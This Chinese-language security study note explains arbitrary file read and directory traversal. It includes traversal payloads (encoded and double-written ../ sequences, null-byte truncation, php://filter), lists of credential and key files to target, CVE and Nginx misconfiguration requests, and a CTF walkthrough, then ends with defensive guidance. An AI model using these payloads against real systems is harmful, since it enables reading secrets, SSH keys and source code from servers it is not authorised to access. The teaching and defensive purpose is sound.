# 任意文件读取与目录穿越

## 一句话理解
应用按用户给的路径去磁盘读文件，却没有把路径限制在预期目录内，攻击者用 `../` 跳出沙箱目录，读走配置、源码、密钥甚至 flag。

## 核心原理
- 用户输入（文件名/路径）拼进文件操作函数（`open`、`readFile`、`FileInputStream`）
- 服务端未做规范化校验，相对路径符号 `../`（Windows 下 `..\`）向上回溯目录
- 与"文件包含"的区别：读取只拿内容，包含会把内容**当代码执行**（见 [EXP-Include-PHP](./EXP-Include-PHP.md)）

## 成立条件
- 存在读文件/下载/预览功能，路径或文件名用户可控
- 路径校验缺失、黑名单可绕过，或校验发生在规范化之前

## 常见触发点与参数
- 文件下载：`/download?file=report.pdf`
- 图片/附件预览：`/preview?path=...`、`/img?src=...`
- 模板/语言包加载：`?template=`、`?lang=`
- 常见参数名：`file`、`filename`、`path`、`filepath`、`download`、`doc`、`src`、`name`

## 常见利用形式
### 1. 相对路径穿越

```text
../../../../etc/passwd
....//....//etc/passwd        （过滤一次 ../ 时双写绕过）
..%2f..%2fetc/passwd          （URL 编码）
..%252f..%252f                （双重编码，前端解码一次、服务端再解码一次）
```

### 2. 绝对路径
直接给绝对路径，很多校验只盯 `../`：

```text
/etc/passwd
C:\Windows\win.ini
```

### 3. 截断与后缀绕过
- `%00` 截断（PHP < 5.3.4 等老环境）：`../../etc/passwd%00.jpg`
- 长度截断：超长 `../` 冲刷掉服务端拼接的固定后缀（老 PHP）
- 伪协议（PHP）：`php://filter/convert.base64-encode/resource=index.php`，把源码 Base64 读出来

### 4. Windows 差异
- 分隔符 `\` 与 `/` 都可能被接受
- 盘符路径 `C:/`、`\\?\C:\`
- 保留设备名（`aux`、`con`）可用于 DoS 探测

## 各语言文件读取函数清单

审计/挖洞时，看到下列函数的入参来自用户输入，就是穿越测试点。

### PHP
| 函数 | 一句话区别 |
| --- | --- |
| `file_get_contents($path)` | 整个文件读成字符串返回，不直接输出 |
| `readfile($path)` | 读取并直接写向输出缓冲（下载接口常用） |
| `fopen()` / `fread()` / `fgets()` | 流式句柄读取，可只读部分内容 |
| `show_source()` / `highlight_file()` | 读取源码并语法高亮输出 |
| `include` / `require` | 读取并**当代码执行**——已是文件包含漏洞，见 [EXP-Include-PHP](./EXP-Include-PHP.md) |

### Java
- `new FileInputStream(path)` + `read()`：基础字节流
- `Files.readAllBytes(Paths.get(path))`：NIO 一次性读入内存
- `RandomAccessFile(path, "r")`：可指定偏移随机读（别误以为限制了读取范围就安全）
- `new InputStreamReader(new FileInputStream(...))`：字符流包装
- `getResource()` / `getResourceAsStream()`：从 classpath 读资源，`../` 同样能跳出包路径

### Python
- `open(path).read()`：最常见写法
- `os.popen('cat ' + path).read()`：一旦走到这里直接升级为命令注入
- `codecs.open(path, encoding=...)`：带编码读取，安全性同 `open()`

### Node.js
- `fs.readFileSync(path)`：同步读入内存
- `fs.createReadStream(path)`：流式读取，下载/预览接口常客

## 读什么
| 目标 | 价值 |
| --- | --- |
| `/etc/passwd`、`C:\Windows\win.ini` | 探测漏洞是否成立的试金石 |
| `/proc/self/environ`、`/proc/self/cmdline` | 环境变量、启动参数（常藏密钥） |
| `/proc/self/fd/*` | 已打开文件句柄，可读日志/配置 |
| `web.xml`、`.env`、`application.yml`、`config.php` | 数据库口令、AKSK、JWT 密钥 |
| 站点源码 | 拿到源码转代码审计，挖 RCE |
| `/var/log/`、Tomcat 日志 | 找 session、后台路径、注入痕迹 |
| `~/.ssh/id_rsa`、`~/.bash_history` | 直接登录、摸清运维习惯 |

## 进阶思路
- 读源码 -> 审计出反序列化/SQLi -> 组合 RCE，是 CTF 与实战的标准链路
- 读取数据库文件（SQLite）、`/proc/self/maps` 辅助进一步利用
- 盲读场景：无回显时结合布尔差异（存在/不存在响应不同）或 OOB 外带

## 框架级案例

### Spring 静态资源路径穿越（CVE-2018-1271）
Spring MVC 静态资源 location 配置为 `file:` 且未以 `/` 结尾时，Windows 上路径分隔符 `\` 配合双重编码绕过规范化校验：

```text
GET /static..%255c..%255c..%255cetc%255cpasswd HTTP/1.1
```

> 要点：`%255c` 双重编码最终还原为 `\`（%5c），规范化发生在完全解码之前导致穿越逃逸；仅 Windows 受影响，Linux 上 `/` 分隔符会被正确处理。

### Nginx alias 误配置穿越
`location` 少了结尾 `/`，`alias` 却带 `/`，前缀替换后残留的 `../` 直接拼到 alias 目录之后：

```nginx
location /files {
    alias /home/;
}
```

```text
GET /files../etc/passwd HTTP/1.1
```

> 要点：Nginx 用 `/files` 前缀匹配后，把剩余的 `../etc/passwd` 直接接到 alias 后，得到 `/home/../etc/passwd`。修复：两边都带斜杠——`location /files/ { alias /home/; }`。

## 快速判断
1. 找读文件类参数，先丢 `../../../../etc/passwd` 看回显
2. 被拦就换编码、双写、绝对路径逐一试
3. 回显过滤了敏感关键词时，用 Base64 伪协议读出再本地解码

## 案例：一道任意文件读取 CTF 题完整流程

题目：`/download?file=xxx` 下载接口。

1. **读 /etc/passwd 确认漏洞**：提交 `?file=../../../../etc/passwd`，回显 `root:x:0:0:...`——任意文件读取成立。
2. **读源码定位 flag 路径**：`?file=../../../../var/www/html/index.php`（源码路径可从 `/etc/passwd` 的用户目录、`/proc/self/cwd` 等推断），发现后端逻辑：

```php
<?php
// 固定前缀拼接，且过滤了一遍 ../
$file = '/var/www/html/files/' . str_replace('../', '', $_GET['file']);
echo file_get_contents($file);
// hint: flag 位于 /flag
```

3. **绕过前缀拼接与过滤**：`str_replace` 单次过滤用双写绕过，叠加足够数量跳出前缀目录：

```text
/download?file=....//....//....//....//flag
```

> `....//` 被过滤掉中间的 `../` 后还原为 `../`，四个叠加即可从 `/var/www/html/files/` 跳回根目录。

4. **读出 flag**：响应返回 `flag{...}`。

## 防御要点
- 白名单校验文件名（只允许预期集合），不校验"路径"而校验"文件 ID"
- 拼接后用 `realpath` / 路径规范化函数处理，确认结果仍以预期目录开头
- 拒绝绝对路径与 `..` 序列，校验放在 URL 完全解码之后
- 单独隔离存储目录，Web 用户最小权限，禁读系统目录

## 参考
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger File path traversal](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
